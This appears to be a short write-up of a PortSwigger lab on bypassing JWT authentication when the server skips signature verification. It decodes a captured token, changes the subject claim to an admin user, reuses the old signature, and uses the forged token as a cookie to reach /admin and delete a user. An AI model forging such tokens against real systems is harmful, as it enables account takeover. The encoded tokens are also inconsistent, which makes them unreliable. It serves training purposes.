/*

1) POST  /login response has a JWT

eyJraWQiOiI3ZWJiNjdmYy04NDMzLTQ0NWQtYTdjNi1mMDRmYTlkZjNmMjEiLCJhbGciOiJSUzI1NiJ9  //header
.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTI4MzEzNX0       //payload
.yGYoWRsJ7rpO9fZFilXenIrfJbyNO_ej1Fm7YQ72IjUvl556w-uVly6TnAoqtqEqSSEIuK9OxnH08XJHb8OQERSG0gVAZWZnJggL8rW8zQcFRNDYegZMrdMO2E5_TmpCPUPWPvVXwD89y-f35cfLcMFPa4nk8lN_tHmdeWNLIvcS2BATeGCeXVm6P5oEnfSDd_ilL6I1GKu8z97_RTu7SOUg3ktKXDeOBqcaCnqdgxEdVelkjboIjPkVibL3jtAHQeQtyGSFZmTuHQXTYKOa6kFbIyD10RMnHU5m3E49V6yAwMFykYXAxpa63g3SJA0mANT0PMo72icSYuqU3nmNQw  //signature

//header

{
    "kid": "7ebb67fc-8433-445d-a7c6-f04fa9df3f21",
    "alg": "RS256"
}

//payload

{
    "iss": "portswigger",
    "sub": "wiener",
    "exp": 1695283135
}


2) If the app is not verifying the signature just change the claim in payload and let 
    the signature and the header remain same
{
    "iss": "portswigger",
    "sub": "admin",
    "exp": 1695283135
}


eyJraWQiOiI3ZWJiNjdmYy04NDMzLTQ0NWQtYTdjNi1mMDRmYTlkZjNmMjEiLCJhbGciOiJSUzI1NiJ9  //header
.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluIiwiZXhwIjoxNjk1MjgzMTM1Tlgw       //payload
.yGYoWRsJ7rpO9fZFilXenIrfJbyNO_ej1Fm7YQ72IjUvl556w-uVly6TnAoqtqEqSSEIuK9OxnH08XJHb8OQERSG0gVAZWZnJggL8rW8zQcFRNDYegZMrdMO2E5_TmpCPUPWPvVXwD89y-f35cfLcMFPa4nk8lN_tHmdeWNLIvcS2BATeGCeXVm6P5oEnfSDd_ilL6I1GKu8z97_RTu7SOUg3ktKXDeOBqcaCnqdgxEdVelkjboIjPkVibL3jtAHQeQtyGSFZmTuHQXTYKOa6kFbIyD10RMnHU5m3E49V6yAwMFykYXAxpa63g3SJA0mANT0PMo72icSYuqU3nmNQw  //signature

3) add this below jwt to GET /admin HTTP/2
session cookie
eyJraWQiOiI3ZWJiNjdmYy04NDMzLTQ0NWQtYTdjNi1mMDRmYTlkZjNmMjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCJzdWIiOiAiYWRtaW5pc3RyYXRvciIsImV4cCI6IDE2OTUyODMxMzV9.yGYoWRsJ7rpO9fZFilXenIrfJbyNO_ej1Fm7YQ72IjUvl556w-uVly6TnAoqtqEqSSEIuK9OxnH08XJHb8OQERSG0gVAZWZnJggL8rW8zQcFRNDYegZMrdMO2E5_TmpCPUPWPvVXwD89y-f35cfLcMFPa4nk8lN_tHmdeWNLIvcS2BATeGCeXVm6P5oEnfSDd_ilL6I1GKu8z97_RTu7SOUg3ktKXDeOBqcaCnqdgxEdVelkjboIjPkVibL3jtAHQeQtyGSFZmTuHQXTYKOa6kFbIyD10RMnHU5m3E49V6yAwMFykYXAxpa63g3SJA0mANT0PMo72icSYuqU3nmNQw

4) read the source find the url to delete the carlos user navigate to it using the cookie in burp repeater

*/